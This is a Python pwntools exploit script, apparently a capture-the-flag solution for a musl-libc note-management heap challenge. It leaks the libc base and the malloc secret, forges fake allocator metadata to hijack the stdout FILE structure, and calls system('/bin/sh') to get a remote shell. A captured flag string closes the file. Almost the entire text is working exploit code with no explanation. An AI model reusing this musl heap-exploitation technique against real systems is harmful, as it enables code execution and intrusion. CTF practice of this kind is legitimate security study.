from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('notegame')
io = remote('114.115.152.113', 49153)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
# libc = ELF('/lib/x86_64-linux-musl/libc.so') 
elf = ELF('notegame')


def add(size, content):
    io.sendlineafter('Note@Game:~$ ', 'AddNote')
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Note: ', content)


def delete(index):
    io.sendlineafter('Note@Game:~$ ', 'DelNote')
    io.sendlineafter('Index: ', str(index))


def edit(index, content):
    io.sendlineafter('Note@Game:~$ ', 'EditNote')
    io.sendlineafter('Index: ', str(index))
    io.sendafter('Note: ', content)


def show(index):
    io.sendlineafter('Note@Game:~$ ', 'ShowNote')
    io.sendlineafter('Index: ', str(index))
    io.recvuntil('Note: ')
    return io.recvline()[:-1]


def updateInfo(size, name, info):
    io.sendlineafter('Note@Game:~$ ', 'UpdateInfo')
    io.sendlineafter('Length: ', str(size))
    io.sendafter('Name: ', name)
    io.sendafter('Info: ', info)


def viewInfo():
    io.sendlineafter('Note@Game:~$ ', 'ViewInfo')
    io.recvuntil('My name: ')
    name = io.recvline()[:-1]
    io.recvuntil('My info: ')
    info = io.recvline()[:-1]
    return name, info


def tmpNote(content, addr = None):
    io.sendlineafter('Note@Game:~$ ', 'TempNote')
    if addr:
        io.sendlineafter('Input the address of your temp note: ', str(addr))
    io.sendafter('Temp Note: ', content)


def backdoor(addr):
    io.sendlineafter('Note@Game:~$ ', 'B4ckD0or')
    io.sendlineafter('Addr: ', str(addr))
    io.recvuntil('Mem: ')
    return io.recvline()[:-1]


def pwn():
    add(0x40, 'a' * 0x40)
    updateInfo(0x10, 'a' * 0x10, 'b' * 0x20)
    updateInfo(0x20, 'a' * 0x20, 'b' * 0x20)
    name, _ =viewInfo()
    libc_base = u64(name[-6:] + b'\x00\x00') - 0xb7870
    __malloc_context = libc_base + 0xb4ac0
    secret = u64(backdoor(__malloc_context)[:8])
    log.success('libc_base: ' + hex(libc_base))
    log.success('secret: ' + hex(secret))

    add(9, 'a' * 9)
    add(9, 'b' * 9)
    fake_meta_area_addr = 0x41414141000
    fake_group_addr = libc_base + 0xb7a60
    __stdout_used = libc_base + 0xb43b0
    prev, next, mem = fake_meta_area_addr + 0x40, __stdout_used, fake_group_addr
    avail_mask, freed_mask, maplen, sc, freeable, last_idx = 0, 0, 0, 0, 1, 0
    fake_meta = p64(prev) + p64(next) + p64(mem) + p32(avail_mask) + p32(freed_mask) 
    fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
    fake_meta_area = p64(secret) + p64(0) + fake_meta
    tmpNote(fake_meta_area + b'\n', fake_meta_area_addr)

    edit(1, p64(fake_meta_area_addr + 0x10) + b'a')
    delete(2)
    payload = b'A' * 0x40 + b'/bin/sh\x00' + p64(0) + p64(1) 
    payload += b'A' * 0x38 + p64(libc_base + libc.sym['system'])
    tmpNote(payload + b'\n')
    # gdb.attach(io)
    io.sendlineafter('Note@Game:~$ ', 'Exit')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()

# flag{9674ab36b62e6b308973ef92c2922b6e}
